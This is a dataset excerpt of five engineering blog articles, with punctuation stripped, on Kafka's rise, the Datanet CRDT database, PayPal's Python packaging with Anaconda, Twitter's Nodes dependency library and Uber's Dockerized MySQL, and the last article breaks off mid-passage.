61,engineering,How Kafka Redefined Data Processing for the Streaming AgeThe Apache Kafka phenomenon reached a new high today when Confluent announced a  50 million investment from the venture capital firm Sequoia  The investment signals renewed confidence that Kafka is fast becoming a new and must have platform for real time data processing  says Kafka co creator and Confluent CEO Jay Kreps    What we re seeing in the world  and why Sequoia and existing investors were so excited  is the emergence of this whole new category of infrastructure around streaming  a streaming platform   Kreps tells Datanami in an interview last week    It s a different category of thing   he adds   I don t think there was something quite like this before  There were technologies that were precursors  but they re pretty different technically    Kafka was created  like all great products  out of necessity  The social network LinkedIn had all manners of distributed systems to help process data  including Hadoop  which it often struggles to run efficiently  see today s story on Dr  Elephant   But the company lacked a durable message bus that could reliably deliver hundreds of millions of messages a day   So Kreps and his LinkedIn colleagues  Neha Narkhede and Jun Rao  did what they needed to do  they built a new publish and subscribe messaging bus for LinkedIn  The new system  dubbed Kafka  worked so well that they decided to open source it  In 2014  Kreps  Rao  and Narkhede left LinkedIn to found Confluent with the idea of building a commercial product around what was then an incubating Apache Kafka project   Since then  Kafka has caught on like wildfire  Companies were impressed not only with Kafka s capability to reliably deliver huge volumes of data from their sources to their destinations  but to do so without requiring large armies of skilled technicians to implement a complex distributed system  Kafka users especially appreciate how they can set up various streams of data  what are known as  Kafka topics   and then allow people to subscribe to those streams  As a standalone distributed system that runs on clusters of X86 servers  Kafka is equally adept at serving up data for transactional and analytical purposes alike   Today  the distributed system has been adopted by more than one third of the Fortune 500  Subscriptions to Confluent Enterprise  a version of Kafka that adds proprietary management and monitoring features  surged by 700  last year  Third party application vendors are flocking to support Kafka and build open source connectors so their customers can partake of the digital riches flowing across these new Kafka pipe   In short  Kafka has quickly become the defacto standard messaging bus underlying real time stream processing  and that puts Confluent and Kreps right at ground zero of a new wave of innovation    It s exciting because there aren t that many truly new categories of infrastructure that come around   he says   There are a million and one databases  and I m sure tomorrow there will be a million and two  But because there are so many  they end up being almost niches  whereas this can really be something that ties together and be the core data flow in the enterprise and the big central nervous system that everything comes off of    Building a digital version of a central nervous system comes with its share of pressure  If Kreps and company bungle something in Kafka  it could impact hundreds of thousands of companies and hundreds of millions of consumers who are dependent on data services that are being built on a Kafka foundation   But Kreps and his Confluent colleagues are building a reputation for getting stuff right  for rolling things out slowly and making sure they ve dotted their i s and crossed their t s before publicly stating that new releases are ready for production use  The company is nearing completion of a major new feature in Kafka  exactly once processing  that is the holy grail of distributed computing  and they re being extra cautious about it   Before starting to code the exactly once processing feature in Kafka  the company published its theory on how to solve the problem in a paper  with the idea that other distributed systems experts can poke holes in the idea and find flaws  Kreps and his colleagues had kicked around ideas for how to add more transactional capabilities into the distributed messaging system  and wanted to see if he was way off base    It s a little like security in that way   Kreps says   You want people to find the flaws early on rather than when it s running in production and it crashes  We ve got through that process  and now we re going through the process of implementing it    You can follow the development of the exactly once feature on GitHub if you so desire  It s not yet ready for production  but Kreps says it s on track to be added to Kafka  perhaps before the Kafka Summit takes place in New York City in May   Kreps seems to get off on tackling these sorts of distributed systems engineering challenges  It s a high stakes game being played out in a public venue  with tens of millions of dollars on the line  It s not a game for the faint of heart  but the rewards are potentially much greater than even the  80 million that Confluent has received in venture capital so far    It s actually technically challenging to make something so complicated actually be simple and easy to use and build on   Kreps says   I guess we ll be judged based on whether or not we can make that successful  as this category emerges and as it matures and as more applications come  It s not an easy thing to do  I m super proud of what we ve built so far and I hope that we continue to be perceived that way by the people adopting it    The baffling thing about Kafka  the enigma as it were  is that it exists on the cutting edge of what computer science can accomplish  and yet it remains a relatively simple tool  especially compared to its distributed system brethren  Hadoop  That s been the design principle of Kafka since the beginning  and Kreps hopes that it will remain that way into the foreseeable future    That s really the challenge we ve set for ourselves   he says   We d like this to be the way that if you re going to build asynchronous microservices in your company  this would be the tool you would reach for  Not the tool you have to reach for if your data is really  really big or the tool you re forced to after you ve exhausted all the other solutions  but the thing that s the easiest and best to go to start with  and it will scale horizontally to the size of a company    Related Items   Exactly Once  Why It s Such a Big Deal for Apache Kafka  Distributed Stream Processing with Apache Kafka  The Real Time Future of Data According to Jay Kreps
62,engineering,Datanet  a New CRDT Database that Let s You Do Bad Bad Things to Distributed DataMonday  October 17  2016 at 9 44AM  We ve had databases targeting consistency  These are your typical RDBMSs  We ve had databases targeting availability  These are your typical NoSQL databases   If you re using your CAP decoder ring you know what s next   what databases do we have that target making concurrency a first class feature  That promise to thrive and continue to function when network partitions occur   No many  but we have a brand new concurrency oriented database  Datanet   a P2P replication system that utilizes CRDT algorithms to allow multiple concurrent actors to modify data and then automatically   sensibly resolve modification conflicts   Datanet is the creation of Russell Sullivan  Russell spent over three years hidden away in his mad scientist layer researching  thinking  coding  refining  and testing Datanet  You may remember Russell  He has been involved with several articles on HighScalability and he wrote AlchemyDB  a NoSQL database  which was acquired by Aerospike   So Russell has a feel for what s next  When he built AlchemyDB he was way ahead of the pack and now he thinks practical  programmer friendly CRDTs are what s next  Why   Concurrency and data locality  To quote Russell   Datanet lets you ship data to the spot where the action is happening  When the action happens it is processed locally  your system s reactivity is insanely quick  This is pretty much the opposite of the non concurrent case where you need to go to a specific machine in the cloud to modify a piece of data regardless of where the action takes place  As your system grows  the concurrent approach is superior  We have been slowly moving away from transactions towards NoSQL for reasons of scalability  availability  robustness  etc  Datanet continues this evolution by taking the next step and moving towards extreme distribution  supporting tons of concurrent writers  The shift is to more distribution in computation  We went from one app server   one DB to app server clusters and clustered DBs  to geographically distributed data centers  and now we are going much further with Datanet  data is distributed anywhere you need it to a local cache that functions as a database master   How does Datanet work   In Datanet  the same piece of data can simultaneously exist as a write able entity in many many places in the stack  Datanet is a different way of looking at data  Datanet more closely resembles an internet routing protocol than a traditional client server database     and this mirrors the current realities that data is much more in flight than it used to be   What bad bad things can you do to your distributed data  Here s an amazing video of how Datanet recovers quickly  predictably  and automatically from Chaos Monkey level extinction events  It s pretty slick   Here s an email interview I did with Russell  He goes into a lot more detail about Datanet and what it s all about  I think you will find it interesting   Let s start with your name and a little of your background   My name is Russell Sullivan  I am a distributed database architect  I created AlchemyDB which was acquired by Aerospike where I became the principal architect and these days I am working on a new startup project called Datanet   What have you brought to show and tell today   A shiny new open source CRDT  conflict free replicated data types  based data synchronization system named Datanet   Datanet is a P2P replication system that utilizes CRDT algorithms to allow multiple concurrent actors to modify data and then automatically   sensibly resolve modification conflicts   Datanet s goal is aims to achieve ubiquitous write though caching   CRDT replication capabilities can be added to any cache in your stack  meaning modifications to these stacks are globally   reliably replicated  Locally modifying data yields massive gains in latency  produces a more efficient replication stream    is extremely robust   It s time to pre fetch data to compute     So AlchemyDB was a key value store and now you are creating a CRDT database  That s a big change  Why have you gone in that direction   CRDTs open up new use cases  you can do things with them that are not feasible without them  Plus I kept running into problems in the field where a CRDT system would be the perfect solution  Lastly Marc Shapiro and his people formalized the field of CRDTs between 2011 2014 so the timing worked   What problems do you see where CRDTs are the perfect solution   CRDT systems have some very interesting properties when compared to traditional data systems   First  in a CRDT system you locally modify your data and then immediately return to computation  This is great for say an app server request that looks up 5 pieces of data and then writes 2 pieces of data  If you are using a traditional DB  you have 7 network I Os for that request  If you are using a CRDT system and you have the necessary pieces of data locally cached  you do ZERO network I Os  in the fast path     you still have to replicate the 2 writes  but this happens later via lazy replication    Second  since CRDT systems have very loose requirements on the immediacy of replication they are inherently more robust in architectures with variable replication latencies  aka  replication over WAN   CRDT systems have no expectations of speedy or reliable replication  so hiccups  lag  or outages in the replication path are not disasters  they are merely delays that will be correctly processed as resources become available   These two points are very different  the first is all about doing everything locally and the second is about being robust to bad WAN networks  but they are subtly closely related  they are both byproducts of the fundamentally different  zero coordination  asynchronous  etc     manner in which CRDT systems replicate data   Can you go up a level or two  What kind of problems can you solving using Datanet that you can t solve or are hard to solve with existing systems   Datanet is unique in that it s a distributed system where data can be modified concurrently by multiple actors and the system automatically resolves any conflicts  To illustrate when these conflicts happen  lets use the example of a service that goes through multiple iterations of scaling   In the beginning the service has a single app server and a single database  As load grows a memcache cluster is added and the single app server becomes a cluster of app servers  Next geographical fail over is added via an additional data center  Finally to decrease request latency and increase request throughput the cluster of app servers is made stateful by adding a write through cache to every app server  Everyone of these system enhancements introduces a new point where additional actors concurrently modify data  In this architecture the list of actors is  each data center s database  each data center s memcache cluster  and every app server in both data centers   If we have 10 app servers per data center this means we have 24 concurrent actors modifying data  Traditional systems can only deal with a single concurrent actor modifying data  so they partition requests accordingly  For instance a given user is software load balanced to a sticky data center and then a sticky app server in that data center and this app servers write through cache is only utilized for per user information   If this architecture used Datanet  the partitioning logic would no longer be needed as all 24 actors are free to modify data concurrently   With Datanet app server logic can be stateless  each app server can locally modify partitionable data  e g  per user  as well as global data  e g  global user login counter  and then replicate asynchronously to every other actor caching the data where CRDT logic resolves the conflicts  The entire replication flow is wildly different than traditional flows  it has advantages in latency and robustness and of course some trade offs     Talks about CRDTs are very popular in academia  But they always sound so impractical  How is Datanet different  What engineering wizardry do you add to make CRDTs work for the everyday programmer   The current state of affairs is that CRDTs are beautiful academia gradually emerging to become practical systems   Datanet provides a simple API  JSON and presents CRDTs as a simple metaphor  local write through caches that replicate globally   JSON is simple  you set strings and numbers  you increment numbers  you add and delete elements from an array  it s all CS 101  Datanet hides the complexities of the underlying commutative replicated data types  e g  distributed zero coordination garbage collection  and clearly communicates how merge operations resolve conflicts  The goal is to lower the barrier of entry from someone with multiple PhD s to the junior developer level     To address CRDTs architectural complexities Datanet s messaging focuses on local operations  an actor modifies the contents of his local cache and this cache also receives external modifications  via Datanet  when other actors modify the same data  Each Datanet actor is a state machine that receives and applies internal and external modifications and stores the results in a local cache   Changing the belief that CRDTs are impractical is important as we re not talking about niche use cases  CRDT style replication has been shown by Peter Bailis of Stanford to be applicable to 70  of the database calls in a large collection of top level github projects   What actually is a CRDT  What operations do you support and what s special about your implementation   CRDTs are pretty hard to explain  so I try to explain them using the following example  A social media site has a rack of app servers  each app server updates a global login counter on user login  Since updating a counter  by one  is a commutative operation replication requirements become looser  replication of individual increment by one operations can be applied in an arbitrary order and the final value of global login counter always turns out the same   Using CRDTs each app server increments a local global login counter and lazily broadcasts the increment operation to all other app servers who then apply the operation  At any point in time  there is no guarantee that all app servers will have the same value for global login counter  there are bound to be increment by one replication operations in flight  but the app servers  values quickly converge to the same value and all increments are guaranteed to be applied  i e  no data loss    This concept of commutative operations being locally applied  then lazily broadcast  then remotely applied  and eventually all actors converging to the same value can be generalized to include data types far more complex than a counter  and this family of data types is called CRDTs   Can you explain the architecture behind Datanet  Datanet s architecture begins at the individual actor level  Actors are mobile devices  browsers  app servers  memcache clusters     they are all database masters that have a local write thru cache of a portion of the entire system s data set  Datanet s architecture begins at the individual actor level  Actors are mobile devices  browsers  app servers  memcache clusters     they are all database masters that have a local write thru cache of a portion of the entire system s data set  Actors modify data in their local cache  then broadcast the modifications peer to peer  to all other actors caching the modified data  and the actors receiving these modifications will apply them to their local cache  Besides Actors there is a centralized component that deals w  K safety  e g  guarantee of 2 copies   drives distributed garbage collection  and deals with re syncing actors who were offline  Datanet s hybrid architecture is p2p for optimal replication latency   centralized for high availability  More info  http   www datanet company architecture html  Question  How much does Datanet cost  What s the licensing  Cost is free  BSD open source license Question  What s your dream for the future of Datanet  Datanet s CRDT algorithms can add value anywhere a write thru cache can add value  which is a long list of places in modern stacks  This means the future for Datanet has tons of possibilities  so the current dream is to penetrate as many places in the stack as possible  which we refer to as  Ubiquitous write thru caching   For example  at the micro level write thru caches can be utilized at the per thread   per process level for performance gains  At the data center level write thru caches can prefetch data to compute for serverless architectures and provide high availability for stateful app server clusters  At the WAN level write thru caches merge the conflicts inherent in multiple data center replication and make it feasible for CDNs to host dynamic real time data at the edge  More use case info  http   datanet company use_cases html  In Datanet  the same piece of data can simultaneously exist as a write able entity in many many places in the stack  Datanet is a different way of looking at data  Datanet more closely resembles an internet routing protocol than a traditional client server database     and this mirrors the current realities that data is much more in flight than it used to be  Datanet Links Website  http   datanet co   Twitter  https   twitter com CRDTDatanet  Github  https   github com JakSprats datanet  Google Group  https   groups google com forum   forum crdtdatanet  Russell Sullivan s Twitter  https   twitter com jaksprats CRDT Articles Readings in CRDTs  Comprehensive study of CRDTs  SwiftCloud  Shapiro talk  SEC   CRDTs  Related Articles
63,engineering,Python Packaging at PayPalYear after year  Pythonists all over are churning out more code than ever  People are learning  the ecosystem is flourishing  and everything is running smoothly  right up until packaging  Packaging Python is fundamentally un Pythonic  It can be a tough lesson to learn  but across all environments and applications  there is no one obvious  right way to deploy  Frankly  it s hard to think of an area where Python s Zen applies less   At PayPal  we write and deploy our fair share of Python  and we wanted to devote a couple minutes to our story and give credit where credit is due  For conclusion seekers  without doubt or further ado  Continuum Analytics  Anaconda Python distribution has made our lives so much easier  For small  and medium sized teams  no matter the deployment scale  Anaconda has big implications  But let s talk about how we got here   Right now  PayPal Python Infrastructure provides equitable support for Windows  OS X  Linux  and Solaris  supporting various combinations of 32 bit and 64 bit Python 2 6  Python 2 7  and PyPy 5   Glossing over the primordial days  when Kurt and I started building the Python platform at PayPal  we didn t know we would be building the first cross platform stack the company had ever seen  It was December 2012  we just wanted to see every developer unwrap a brand new laptop running PayPal Python services locally   What ensued was the most intense engineering sprint I had ever experienced  We ported critical functionality previously only available in shared objects we had been calling into with ctypes  Several key parts were available in binary form only and had to be disassembled  But with the New Year  2013  we were feeling like a whole new stack  All the PayPal specific parts of our framework were pure Python and portable  Just needed to install a few open source libraries  like gevent  greenlet  maybe lxml  Just pip install   right   In an environment where Python is still a new technology to most  pip is often not available  let alone understood  This learning curve can represent a major hurdle to many  We wanted more people to be able to write Python  and even more to be able to run it  as many places as possible  regardless of whether they were career Pythonists  So with a judicious shake of Python simplicity  we adopted a policy of  vendoring in  all of our core dependencies  including compiled extensions  like gevent   This model yields somewhat larger repositories  but the benefits outweighed a few extra seconds of clone time  Of all the local development stories  there is still no option more empowering than the fully self contained repository  Clone and run  A process so seamless  it s like a miniature demo that goes perfect every time  In a world of multi hour C   and Java builds  it might as well be magic    So what s the problem    Static builds  Every few months  or every CVE  the Python team would have to sit down to refresh  regression test  and certify a new set of libraries  New libraries were added sparingly  which is great for auditability  but not so great for flexibility  All of this is fine for a tight set of networking  cryptography  and serialization libraries  but no way could we support the dozens of dependencies necessary for machine learning and other advanced Python use cases   And then came Anaconda  With the Anaconda Python distribution  Continuum is doing effectively what our team had been doing  but for free  for everyone  for hundreds of libraries  Finally  there was a standard option that made Python even simpler for our developers   As soon as we had the opportunity  we made Anaconda a supported platform for development  From then on  regardless of platform  Python beginners got one of two introductions  Install Anaconda  or visit our shared Jupyter Notebook  also backed by Anaconda   Today  Anaconda has gone beyond development environments to enable production PayPal machine learning applications for the better part of a year  And it s doing so with more optimizations than we can shake a stick at  including running all the intensive numerical operations on Intel s MKL  From now on  Python applications exist on a moving walkway to production perfection   This was realized through two Anaconda packaging models that work for us  The first preinstalls a complete Anaconda on top of one of PayPal s base Docker images  This works  and is buzzword compliant  but for reasons outside the scope of this post  also entails maintaining a single large Docker image with the dependencies of all our downstream users   As with all packaging  there s always another way  One alternative approach that has worked well for us involves a little Continuum project known as Miniconda  This minimalist distribution has just enough to make Python and conda work  At build time  our applications package Miniconda  the bzip2 conda archives of the dependencies  and a Python installer  wrapped up with a CalVer filename  At deploy time  we install Miniconda  then conda install the dependencies  No downloads  no compilation  no outside dependencies  The code is only a little longer than the description of the process  Conda envs are more powerful than virtualenvs  and have a better cross platform  cross dev prod story  as well  Developers enjoy the increased control  smaller packages  and applicability across both standard and containerized environments   As stated in Enterprise Software with Python  packaging and deployment is not the last step  The key to deployment success is uniform  well specified environments  with minimal variation between development and production  Or use Anaconda and call it good enough  We sincerely thank the Anaconda contributors for their open source contributions  and hope that their reach spreads to ever more environments and runtimes 
64,engineering,Simplify Service Dependencies with NodesRPC services can be messy to implement  It can be even messier if you go with microservices  Rather than writing a monolithic piece of software that s simple to deploy but hard to maintain  you write many small services each dedicated to a specific functionality  with a clean scope of features  They can be running in different environments  written at different times  and managed by different teams  They can be as far as a remote service across the continent  or as close as a logical component living in your own server process providing its work through an interface  synchronous or asynchronous  All said  you want to put together the work of many smaller components to process your request   This was exactly the problem that Blender  one of the major components of the Twitter Search backend  was facing  As one of the most complicated services in Twitter  it makes more than 30 calls to different services with complex interdependencies for a typical search request  eventually reaching hundreds of machines in the data center darkness  Since its deployment in 2011  it has gone through several generations of refactoring regarding its dependency handling   At the beginning  it was simple  We had to call several backend services and put together a search response with the data collected  It s easy to notice the dependencies between them  you need to get something from service A if you want to create a request for service B and C  whose responses will be used to create something to query service D with  and so on  We can draw a Directed Acyclic Graph  DAG  for dependencies between services in the workflow that processes the request  like this one   Figure 1  Obviously there s some parallelism we can exploit  service B and C can be executed at the same time  as can D and E  as they don t depend on each other  Our first solution for the execution was to run a topological sort on the graph and break it into batches  All services in the same batch can be run at the same time  Batches were implemented using Netty pipeline and there is effectively a barrier at the end of each batch  so the workflow will only proceed to the next batch when all service calls in the current one have finished  The responses from all services are put into a shared store  a monolithic function pulls necessary responses from it to create new requests for services in the next batch   This design works for simple workflows  but there are some problems  First  its execution is not efficient  Clearly service E can start as soon as C is done and doesn t have to wait on B  as it doesn t depend on it  However  they are in different batches  so it has to wait  What if B takes a long time  This introduces a false dependency and reduces parallelism  Second  and more importantly  there s no enforcement of the data dependency because of the shared response store  The graph above only defines the execution order  When you create the request for service D  there s nothing preventing you from fetching things other than responses from B or C  like E s response  You can try to get responses from services not executed yet  and it needed a lot of programmer s discretion to get things right   Another problem is that we only allowed one instance of each service in the graph  so it was not easy to call the same service multiple times within a single request  It was also hard to write code that made dynamic decisions regarding the execution of the graph based on the execution state  e g  skipping a section of graph  Everything was fixed in advance   What if you want to reuse a part or all of a graph  It s hard  Each workflow is conceptually a graph  merging multiple graphs should just get you a bigger graph  not something totally different  We were not properly exploiting the recursive nature of graphs to simplify our code  The lack of modularity in the code also made testing hard  as there was no straightforward way to pull out a piece of workflow and test it   We used to have separate workflows  each being a graph  for different types of search  like search for Tweets  search for accounts  etc  The frontend had to make multiple calls to the backend to get results together and display them  We wanted to create a composite search result page with all kinds of results processed together  so that we have a better chance of organizing them nicer in a stream  This was our  Universal Search  project back in 2012  Merging many existing graphs  workflows  into a new one was pretty much a handicraft  you had to resolve conflicts  watch out for duplicate service calls  and even manually adjust graph edges to work around the batching to get optimized execution  not wasting much parallelism  Adding a tiny edge in the graph could throw off your batching and accidentally increase the latency  This was definitely not the right thing to keep in the long run  Our complexity had outgrown the design  and we needed to have something new   Around mid 2011  Twitter released Finagle  a Scala library to implement protocol agnostic RPC systems  It introduced a nice paradigm for concurrent programming with Futures  A Future represents an asynchronous data object whose value will become available some time in the  well  future  It supports a set of operations for transforming them  merging them  and dealing with their failure and exceptions with callbacks  Logically  this is bridging the barrier of synchronous and asynchronous programming  Your logic is still function like  taking inputs and producing an output  except that inputs could be asynchronous and not ready when the function call is made  or attached   so it has to wait  The concept of Future decouples the computation logic from the execution of the dependency graph  allowing programmers to better focus on the application logic  rather than gathering and synchronizing the things produced in various threads   Finagle was a natural fit for Blender as it solved a big problem we had on the service batch design  the dependencies are actually between the data  not between the computation processes themselves that generate the data  From the perspective of a computation process  where its inputs are produced is irrelevant  it can flow in from anywhere  With this idea  we can redraw our dependency graph   Figure 2  In the diagram  we have separated the data  gray boxes  and the computation processes  blue dots   Each process takes one or more pieces of data as inputs  and produces a single output  The process can start as soon as its input are ready  and not subject to any arbitrary batching  You can easily write every process as a function  in Java   e g  for process D   Internally  there could be one of the following mirror functions that provides the real logic  depending on whether the actually process to produce D s response is synchronous or asynchronous   Notice that they have all input arguments  de futured   that is  they are only called when the values for B and C are ready and resolved into their original types  which is guaranteed by the scheduling execution framework  The framework we used is Finagle  or its Futures programming paradigm to be more specific  This function duality between process   and syncProcess asyncProcess   is just an artifact of the fact that asynchronous processing is not a primitive action in our programming language  Java   Finagle fills this gap with its Future operations  Now you can write code like   or  if the value of D cannot be directly computed  but has to be acquired through a remote service   The application logic is only in syncProcess   or asyncProcess    but there s a lot of boilerplate code to just connect the worlds of Futures and non Futures  When it comes to multiple inputs and complex dependency chains  it can again become a bit messy  You can de future your Futures at any place and end up having some methods with partly Future and partly non Future arguments  Sometimes you want to have control flow logic on Futures  like  if Future A  has value X then we compute Future B  this way  or we call process X and produce it another way   You end up with a lot of callbacks and risk running out of indentations had you not properly organized your calls  The dual functions are also not very elegant  resulting in boilerplate and repetitive code  Java should take part of the blame  it looks better in Scala  and also in Java 8 with lambdas   but it s also because the asynchronous processing here is still not transparent enough  The Future programming paradigm provides good primitives  but the computation logic lives in the cracks of these primitives   it s the glue putting them together that ruins the readability   Nonetheless  Finagle still solved a huge problem for us as we now have real data dependencies and a more efficient execution engine  We gradually converted the Blender workflow code from batch style to Future style in 2013  It ran faster  the code became less error prone but the readability was still not perfect  It was hard to follow  a pain to debug  tricky to test  and there were lots of duplicate function names   Then we introduced Nodes   Let s look at the modified dependency graph again   Figure 3  The process D takes input B and C  and produces a value of type D  Rather than passing them around as Future B   Future C  and Future D   we come up with a new concept of Node  a Future like object which combines the computation logic and the data being produced  and abstracts away the  de futuring  code that had to coexist with the computation logic before  Unlike Futures  Nodes can have dependencies declared in it  and you can construct a Node with all its dependencies  However  a node can also have no dependency at all  wrapping directly around a computation process or even a literal value  Nodes and Futures are compatible and mutually convertible  so we could migrate our original code piece by piece   You can consider Node as an asynchronous processing unit  it can be instantiated as many times as you wish  each time taking the same or different inputs  Depending on how many inputs you have  we provide several styles for you to specify them  either through a simple mapping with Java 8 lambdas  or from enum based named dependencies handled in a separate class if the logic is more complex  It doesn t matter if your computation is big or small  remote or local  synchronous or asynchronous  The Nodes library makes all these transparent to the programmer assembling the graph  It doesn t say how each Future is to be fulfilled  this matters only to the Nodes that actually does asynchronous computations  The scheduling of these computations could be completely blocking  or based on thread pools implemented by yourself  or provided by other frameworks  like Finagle   To implement the dependency graph in Figure 1 above  your code may look like   Here it lists several possible ways to wrap and create Nodes  though not exhaustively  With Nodes  all dependencies are explicit  and a computation process in the Node would only have access to the data it explicitly depends on  Dependencies can be defined as required or optional  A Node s failure  say  an exception is thrown during its execution  won t affect the downstream Node optionally depending on it   A Node will not automatically execute once it s created  this only sets up the dependency graph  You need to call  apply   on the node you want response for  This will in turn trigger the execution of all its dependencies  and recursively their dependencies  A Node will execute only once and cache its result   We provide a lot of convenient utilities on top of Nodes to make writing asynchronous code even easier   Operations to transform nodes like  map   and  flatMap    like you would find on Futures   Control flow support  you can create conditional code based on the value or the state of a node   Boolean operations for nodes with boolean value types   Subgraph support  you can organize nodes into subgraphs  each capable of returning multiple outputs  compared to only one on a single node  This allow you to keep the code modular and easy to reuse a part of a complex graph   Debug logging support  even without adding any code  Nodes framework automatically generates debug information for you to track the execution of the graph and also provides an API to add your custom debug information at different debug levels   Visualization  the Nodes library can automatically generates the visualization of your dependency graph in  dot format  viewable and exportable with GraphViz   Here is an example of the graph generated from our example code on Github   Figure 4  We have created a set of guidelines and best practices for writing Nodes code available with our tutorials on Github   After using this compact library for two years in our production search backend and serving billions of requests  we believe it s mature enough to release to the open source community  We have saved thousands of lines of code  improved our test coverage and ended up with code that s more readable and friendly for newcomers  We believe this can help other engineers writing concurrent applications or services  especially making it much easier to implement complex dependency graphs   The application of Node can be taken farther than merely writing RPC services  It doesn t have to be for short lived executions like processing server requests  What if a Future can take days to fulfill  What if you can serialize and checkpoint the state of a graph and even resume it  We have experimented with some of these idea and are looking forward to seeing other novel applications of the Nodes framework   You can download Nodes from https   github com twitter nodes and read our tutorials and example code   Many people have contributed to this library  they are  Brian Guarraci  Tian Wang  Yatharth Saraf  Lisa Huang  Juan Manuel Caicedo  Andy Schlaikjer 
65,engineering,Dockerizing MySQL at Uber Engineeringby Joakim Recht  Uber Engineering s Schemaless storage system powers some of the biggest services at Uber  such as Mezzanine  Schemaless is a scalable and highly available datastore on top of MySQL  clusters  Managing these clusters was fairly easy when we had 16 clusters  These days  we have more than 1 000 clusters containing more than 4 000 database servers  and that requires a different class of tooling   Initially  all our clusters were managed by Puppet  a lot of ad hoc scripts  and manual operations that couldn t scale at Uber s pace  When we began looking for a better way to manage our increasing number of MySQL clusters  we had a few basic requirements   Run multiple database processes on each host  Automate everything  Have a single entry point to manage and monitor all clusters across all data center  The solution we came up with is a design called Schemadock  We run MySQL in Docker containers  which are managed by goal states that define cluster topologies in configuration files  Cluster topologies specify how MySQL clusters should look  for example  that there should be a Cluster A with 3 databases  and which one should be the master  Agents then apply those topologies on the individual databases  A centralized service maintains and monitors the goal state for each instance and reacts to any deviations   Schemadock has many components  and Docker is a small but significant one  Switching to a more scalable solution has been a momentous effort  and this article explains how Docker helped us get here   Why Docker in the first place   Running containerized processes makes it easier to run multiple MySQL processes on the same host in different versions and configurations  It also allows us to colocate small clusters on the same hosts so that we can run the same number of clusters on fewer hosts  Finally  we can remove any dependency on Puppet and have all hosts be provisioned into the same role   As for Docker itself  engineers build all of our stateless services in Docker now  That means that we have a lot of tooling and knowledge around Docker  Docker is by no means perfect  but it s currently better than the alternatives   Why not use Docker   Alternatives to Docker include full virtualization  LXC containers  and just managing MySQL processes directly on hosts through for example Puppet  For us  choosing Docker was fairly simple since it fits into our existing infrastructure  However  if you re not already running Docker then just doing it for MySQL is going to be a fairly big project  you need to handle image building and distribution  monitoring  upgrading Docker  log collection  networking  and much more   All of this means that you should really only use Docker if you re willing to invest quite a lot of resources in it  Furthermore  Docker should be treated as a piece of technology  not a solution to end all problems  At Uber we did a careful design which had Docker as one of the components in a much bigger system to manage MySQL databases  However  not all companies are at the same scale as Uber  and for them a more straightforward setup with something like Puppet or Ansible might be more appropriate   The Schemaless MySQL Docker Image  At the base of it  our Docker image just downloads and installs Percona Server and starts mysqld this is more or less like the existing Docker MySQL images out there  However  in between downloading and starting  a number of other things happen   mysql_install_db and create some default users and tables  For a minion   initiate a data sync from backup or another node in the cluster  If there is no existing data in the mounted volume  then we know we re in a bootstrap scenario  For a master  run  Once the container has data  mysqld will be started   If any data copy fails  the container will shut down again   The role of the container is configured using environment variables  What s interesting here is that the role only controls how the initial data is retrieved the Docker image itself doesn t contain any logic to set up replication topologies  status checking  etc  Since that logic changes much more frequently than MySQL itself  it makes a lot of sense to separate it   The MySQL data directory is mounted from the host file system  which means that Docker introduces no write overhead  We do  however  bake the MySQL configuration into the image  which basically makes it immutable  While you can change the config  it will never go into effect due to the fact that we never reuse Docker containers  If a container shuts down for whatever reason  we don t just start it again  We delete the container  create a new one from the latest image with the same parameters  or new ones if the goal state has changed   and start that one instead   Doing it this way gives us a number of advantages   Configuration drift is much easier to control  It boils down to a Docker image version  which we actively monitor   Upgrading MySQL is a simple matter  We build a new image and then shut containers down in an orderly fashion   If anything breaks we just start all over  Instead of trying to patch things up  we just drop what we have and let the new container take over   Building the image happens through the same Uber infrastructure that powers stateless services  The same infrastructure replicates images across data centers to make them available in local registries   There s a disadvantage of running multiple containers on the same host  Since there is no proper I O isolation between containers  one container might use all the available I O bandwidth  which then leaves the remaining containers starved  Docker 1 10 introduced I O quotas  but we haven t experimented with those yet  For now we cope with this by not oversubscribing hosts and continuously monitoring the performance of each database   Scheduling Docker Containers and Configuring Topologies  Now that we have a Docker image that can be started and configured as either master or minion  something needs to actually start these containers and configure them into the right replication topologies  To do this  an agent runs on each database host  The agents receive goal state information for all the databases that should be running on the individual hosts  A typical goal state looks like this    schemadock01 mezzanine mezzanine us1 cluster8 db4       app_id    mezzanine mezzanine us1 cluster8 db4     state    started     data       semi_sync_repl_enabled   false    name    mezzanine us1 cluster8 db4     master_host    schemadock30     master_port   7335    disabled   false    role    minion     port   7335    size    all         This tells us that on host schemadock01 we should be running one Mezzanine database minion on port 7335  and it should have the database running on schemadock30 7335 as master  It has size  all   which means it s the only database running on that host  so it should have all memory allocated to it   How this goal state is created is a topic for another post so we ll skip to the next steps  an agent running on the host receives it  stores it locally  and starts processing it   The processing is actually an endless loop that runs every 30 seconds  somewhat like running Puppet every 30 seconds  The processing loop checks whether the goal state matches the actual state of the system through the following actions   Check whether a container is already running  If not  create one with the configuration and start it  Check whether the container has the right replication topology  If not  try to fix it  If it s a minion but should be a master verify that it s safe to change to master role  We do this by checking that the old master is read only and that all GTIDs have been received and applied  Once that is the case  it s safe to remove the link to the old master and enable writes   If it s a master but should be disabled  turn on read only mode   If it s a minion but replication is not running  then set up the replication link  Check various MySQL parameters   read_only and super_read_only   sync_binlog   etc   based on the role  Masters should be writeable  minions should be read_only  etc  Furthermore  we reduce the load on the minions by turning off binlog fsync and other similar parameters    Start or shut down any support containers  such as pt heartbeat and pt deadlock logger    Note that we very much subscribe to the idea of single process  single purpose containers  That way we don t have to reconfigure running containers  and it s much easier to control upgrades   If an error happens at any point  the process just raises an error and aborts  The whole process is then retried in the next run  We make sure to have as little coordination between individual agents as possible  This means that we don t care about ordering  for example  when provisioning a new cluster  If you re manually provisioning a new cluster you would probably do something like this   Create the MySQL master and wait for it to become ready Create the first minion and connect it to the master Repeat for the remaining minion  Of course  eventually something like this has to happen  What we don t care about is the explicit ordering  though  We ll just create goal states reflecting the final state we want to achieve    schemadock01 mezzanine cluster1 db1       data       disabled   false    role    master     port   7335    size    all           schemadock02 mezzanine cluster1 db2       data       master_host    schemadock01     master_port   7335    disabled   false    role    minion     port   7335    size    all           schemadock03 mezzanine cluster1 db3       data       master_host    schemadock01     master_port   7335    disabled   false    role    minion     port   7335    size    all         This is pushed to the relevants agents in random order and they all start working on it  To reach the goal state  a number of retries might be required  depending on the ordering  Usually  the goal states are reached within a couple of retries  but some operations might actually require 100s of retries  For example  if the minions start processing first then they won t be able to connect to the master  and they have to retry later  Since it might take a little time to get the master up and running  the minions might have to retry a lot of times   An example of 2 minions starting up before the master  On the initial startup  steps 1 and 2   the minions won t be able 